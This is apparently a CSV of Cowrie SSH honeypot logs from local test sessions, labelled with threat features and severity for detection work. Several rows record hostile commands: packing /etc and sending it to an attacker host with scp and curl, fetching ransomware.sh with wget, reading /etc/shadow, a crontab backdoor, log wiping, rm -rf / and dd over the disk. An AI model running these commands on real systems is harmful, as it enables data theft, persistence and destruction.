timestamp,eventid,src_ip,session,username,password,command,message,protocol,recon_activity,malware_activity,privilege_escalation,destructive_behavior,persistence_behavior,command_length,failed_command,severity
2026-05-17T18:54:42.557347Z,cowrie.session.closed,127.0.0.1,7a4f962adbaa,,,,Connection lost after 32.3 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:44.439942Z,cowrie.session.connect,127.0.0.1,1016dece0ea6,,,,New connection: 127.0.0.1:56896 (127.0.0.1:2222) [session: 1016dece0ea6],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:44.443734Z,cowrie.client.version,127.0.0.1,1016dece0ea6,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:44.450393Z,cowrie.client.kex,127.0.0.1,1016dece0ea6,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:51.088005Z,cowrie.login.success,127.0.0.1,1016dece0ea6,root,ygvcnbkjlki,,login attempt [root/ygvcnbkjlki] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:51.136340Z,cowrie.client.size,127.0.0.1,1016dece0ea6,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:51.139155Z,cowrie.client.var,127.0.0.1,1016dece0ea6,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:51.140716Z,cowrie.client.var,127.0.0.1,1016dece0ea6,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:51.154458Z,cowrie.session.params,127.0.0.1,1016dece0ea6,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:29.555993Z,cowrie.command.input,127.0.0.1,1016dece0ea6,,,tar -czf loot.tar.gz /etc/,CMD: tar -czf loot.tar.gz /etc/,ssh,0,0,0,0,0,26,0,Normal
2026-05-17T18:55:29.562843Z,cowrie.command.input,127.0.0.1,1016dece0ea6,,,scp loot.tar.gz attacker@10.0.0.5:/tmp,CMD: scp loot.tar.gz attacker@10.0.0.5:/tmp,ssh,0,0,0,0,0,38,0,Normal
2026-05-17T18:55:33.496441Z,cowrie.session.file_download,127.0.0.1,1016dece0ea6,,,curl -x post http://evil-server/upload -f file=@loot.tar.gz,INPUT (scp): curl -X POST http://evil-server/upload -F file=@loot.tar.gz,ssh,0,1,0,0,0,59,0,Medium
2026-05-17T18:55:33.561783Z,cowrie.log.closed,127.0.0.1,1016dece0ea6,,,,Closing TTY Log: var/lib/cowrie/tty/50c52b14ea528bfc6a429a70f3b9413d658edc87c6123c20f2ef7c88c22edc5b after 42.4 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:33.565116Z,cowrie.session.closed,127.0.0.1,1016dece0ea6,,,,Connection lost after 49.1 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:49.562184Z,cowrie.session.connect,127.0.0.1,d1947e624fc8,,,,New connection: 127.0.0.1:44136 (127.0.0.1:2222) [session: d1947e624fc8],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:49.563523Z,cowrie.client.version,127.0.0.1,d1947e624fc8,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:49.565831Z,cowrie.client.kex,127.0.0.1,d1947e624fc8,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:55.176013Z,cowrie.login.success,127.0.0.1,d1947e624fc8,root,u82sed67,,login attempt [root/u82sed67] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:55.240225Z,cowrie.client.size,127.0.0.1,d1947e624fc8,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:55.242826Z,cowrie.client.var,127.0.0.1,d1947e624fc8,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:55.243761Z,cowrie.client.var,127.0.0.1,d1947e624fc8,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:55:55.245136Z,cowrie.session.params,127.0.0.1,d1947e624fc8,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:01.839877Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,wget http://malicious.com/ransomware.sh,CMD: wget http://malicious.com/ransomware.sh,ssh,0,1,0,0,0,39,0,Medium
2026-05-17T18:56:04.003334Z,cowrie.session.file_download,127.0.0.1,d1947e624fc8,,,,Downloaded URL (http://malicious.com/ransomware.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:04.703001Z,cowrie.session.file_download,127.0.0.1,d1947e624fc8,,,,Downloaded URL (http://evil.com/botnet.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:20.254211Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,./ransomware.shexit,CMD: ./ransomware.shexit,ssh,0,1,0,0,0,19,0,Medium
2026-05-17T18:56:20.257414Z,cowrie.command.failed,127.0.0.1,d1947e624fc8,,,./ransomware.shexit ,Command not found: ./ransomware.shexit ,ssh,0,1,0,0,0,20,1,Medium
2026-05-17T18:56:22.396785Z,cowrie.command.input,127.0.0.1,d1947e624fc8,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:56:22.398630Z,cowrie.log.closed,127.0.0.1,d1947e624fc8,,,,Closing TTY Log: var/lib/cowrie/tty/25c5a404bf67c67c8abe7183b4497d48d6f99987258f4f65c13a6df956c2edc3 after 27.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:22.401306Z,cowrie.session.closed,127.0.0.1,d1947e624fc8,,,,Connection lost after 32.8 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:24.153217Z,cowrie.session.connect,127.0.0.1,ee2b60898e62,,,,New connection: 127.0.0.1:42630 (127.0.0.1:2222) [session: ee2b60898e62],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:24.154338Z,cowrie.client.version,127.0.0.1,ee2b60898e62,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:24.156013Z,cowrie.client.kex,127.0.0.1,ee2b60898e62,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:31.588451Z,cowrie.login.success,127.0.0.1,ee2b60898e62,root,history -c,,login attempt [root/history -c] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:31.891680Z,cowrie.client.size,127.0.0.1,ee2b60898e62,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:31.893016Z,cowrie.client.var,127.0.0.1,ee2b60898e62,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:31.893658Z,cowrie.client.var,127.0.0.1,ee2b60898e62,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:31.894630Z,cowrie.session.params,127.0.0.1,ee2b60898e62,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:38.804786Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,history -c,CMD: history -c,ssh,0,0,0,0,0,10,0,Normal
2026-05-17T18:56:39.259086Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,rm -rf /var/log/*,CMD: rm -rf /var/log/*,ssh,0,0,0,1,0,17,0,Critical
2026-05-17T18:56:51.023893Z,cowrie.command.input,127.0.0.1,ee2b60898e62,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:56:51.025598Z,cowrie.log.closed,127.0.0.1,ee2b60898e62,,,,Closing TTY Log: var/lib/cowrie/tty/5cd4f52b4caa6992a18f64d9b5a7e895e6a9bd58d739c54229a8fc37b81f31d1 after 19.1 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:51.027772Z,cowrie.session.closed,127.0.0.1,ee2b60898e62,,,,Connection lost after 26.9 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:56.063416Z,cowrie.session.connect,127.0.0.1,e6e1dd3bfe43,,,,New connection: 127.0.0.1:34162 (127.0.0.1:2222) [session: e6e1dd3bfe43],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:56.065874Z,cowrie.client.version,127.0.0.1,e6e1dd3bfe43,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:56:56.067428Z,cowrie.client.kex,127.0.0.1,e6e1dd3bfe43,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:01.959414Z,cowrie.login.success,127.0.0.1,e6e1dd3bfe43,root,wsedplovbhyOM,,login attempt [root/wsedplovbhyOM] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:02.000754Z,cowrie.client.size,127.0.0.1,e6e1dd3bfe43,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:02.002259Z,cowrie.client.var,127.0.0.1,e6e1dd3bfe43,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:02.003185Z,cowrie.client.var,127.0.0.1,e6e1dd3bfe43,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:02.018716Z,cowrie.session.params,127.0.0.1,e6e1dd3bfe43,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:08.351992Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,ssh admin@192.168.1.10,CMD: ssh admin@192.168.1.10,ssh,0,0,0,0,0,22,0,Normal
2026-05-17T18:57:48.115873Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,,CMD: ,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:48.122516Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~#  ,CMD: root@localhost:~#  ,ssh,0,0,0,0,0,19,0,Normal
2026-05-17T18:57:48.123690Z,cowrie.command.failed,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~ ,Command not found: root@localhost:~ ,ssh,0,0,0,0,0,17,1,Normal
2026-05-17T18:57:53.241249Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,,CMD: ,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:57:53.244024Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~#  ,CMD: root@localhost:~#  ,ssh,0,0,0,0,0,19,0,Normal
2026-05-17T18:57:53.260367Z,cowrie.command.failed,127.0.0.1,e6e1dd3bfe43,,,root@localhost:~ ,Command not found: root@localhost:~ ,ssh,0,0,0,0,0,17,1,Normal
2026-05-17T18:58:03.345841Z,cowrie.command.input,127.0.0.1,e6e1dd3bfe43,,,scp payload.sh user@192.168.1.15:/tmp,CMD: scp payload.sh user@192.168.1.15:/tmp,ssh,0,0,0,0,0,37,0,Normal
2026-05-17T18:59:41.157603Z,cowrie.session.file_download,127.0.0.1,e6e1dd3bfe43,,,,INPUT (scp): ,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:41.219500Z,cowrie.log.closed,127.0.0.1,e6e1dd3bfe43,,,,Closing TTY Log: var/lib/cowrie/tty/8d7b169c5df9bab1aa8b7101d35856c50644aa804a97e0aad4fbc9550289dd29 after 159.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:41.226277Z,cowrie.session.closed,127.0.0.1,e6e1dd3bfe43,,,,Connection lost after 165.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:49.376545Z,cowrie.session.connect,127.0.0.1,5adf874f3eda,,,,New connection: 127.0.0.1:58940 (127.0.0.1:2222) [session: 5adf874f3eda],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:49.379433Z,cowrie.client.version,127.0.0.1,5adf874f3eda,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:49.389977Z,cowrie.client.kex,127.0.0.1,5adf874f3eda,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:52.526530Z,cowrie.login.success,127.0.0.1,5adf874f3eda,root,iuyht,,login attempt [root/iuyht] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:52.610007Z,cowrie.client.size,127.0.0.1,5adf874f3eda,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:52.611021Z,cowrie.client.var,127.0.0.1,5adf874f3eda,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:52.611537Z,cowrie.client.var,127.0.0.1,5adf874f3eda,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:59:52.614444Z,cowrie.session.params,127.0.0.1,5adf874f3eda,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:00:00.924480Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,rm -rf /,CMD: rm -rf /,ssh,0,0,0,1,0,8,0,Critical
2026-05-17T19:00:02.618526Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,dd if=/dev/zero of=/dev/sda,CMD: dd if=/dev/zero of=/dev/sda,ssh,0,0,0,1,0,27,0,Critical
2026-05-17T19:01:00.102189Z,cowrie.command.input,127.0.0.1,5adf874f3eda,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T19:01:00.138052Z,cowrie.log.closed,127.0.0.1,5adf874f3eda,,,,Closing TTY Log: var/lib/cowrie/tty/3c134a288a2767dea02b65b2807eb98781c2b70bf121a8bb8bad9cc8728bdf6d after 67.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:01:00.156078Z,cowrie.session.closed,127.0.0.1,5adf874f3eda,,,,Connection lost after 70.8 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:06.545697Z,cowrie.session.connect,127.0.0.1,ec674b411fce,,,,New connection: 127.0.0.1:58408 (127.0.0.1:2222) [session: ec674b411fce],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:06.556118Z,cowrie.client.version,127.0.0.1,ec674b411fce,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:06.570301Z,cowrie.client.kex,127.0.0.1,ec674b411fce,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:12.236741Z,cowrie.login.success,127.0.0.1,ec674b411fce,root,b5c8n0ko99,,login attempt [root/b5c8n0ko99] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:12.519059Z,cowrie.client.size,127.0.0.1,ec674b411fce,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:12.522156Z,cowrie.client.var,127.0.0.1,ec674b411fce,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:12.524916Z,cowrie.client.var,127.0.0.1,ec674b411fce,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:12.540891Z,cowrie.session.params,127.0.0.1,ec674b411fce,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:02:17.803429Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
2026-05-17T19:02:18.871974Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
2026-05-17T19:02:42.118665Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
2026-05-17T19:02:48.782614Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,rm -rf /,CMD: rm -rf /,ssh,0,0,0,1,0,8,0,Critical
2026-05-17T19:02:49.592403Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,dd if=/dev/zero of=/dev/sda,CMD: dd if=/dev/zero of=/dev/sda,ssh,0,0,0,1,0,27,0,Critical
2026-05-17T19:02:59.947677Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,wget malware.sh,CMD: wget malware.sh,ssh,0,1,0,0,0,15,0,Medium
2026-05-17T19:03:07.196562Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,./malware.shls,CMD: ./malware.shls,ssh,1,1,0,0,0,14,0,Medium
2026-05-17T19:03:07.198397Z,cowrie.command.failed,127.0.0.1,ec674b411fce,,,./malware.shls ,Command not found: ./malware.shls ,ssh,1,1,0,0,0,15,1,Medium
2026-05-17T19:03:07.200462Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,pwd,CMD: pwd,ssh,1,0,0,0,0,3,0,Low
2026-05-17T19:03:07.667711Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
2026-05-17T19:03:20.959594Z,cowrie.command.input,127.0.0.1,ec674b411fce,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T19:03:20.993738Z,cowrie.session.file_download,127.0.0.1,ec674b411fce,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:03:20.997656Z,cowrie.log.closed,127.0.0.1,ec674b411fce,,,,Closing TTY Log: var/lib/cowrie/tty/ec752396bc81d112cc99c23b220fe9d484b3a2618aea3e36c18423d0f0045698 after 68.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T19:03:21.005383Z,cowrie.session.closed,127.0.0.1,ec674b411fce,,,,Connection lost after 74.5 seconds,ssh,0,0,0,0,0,0,0,Normal
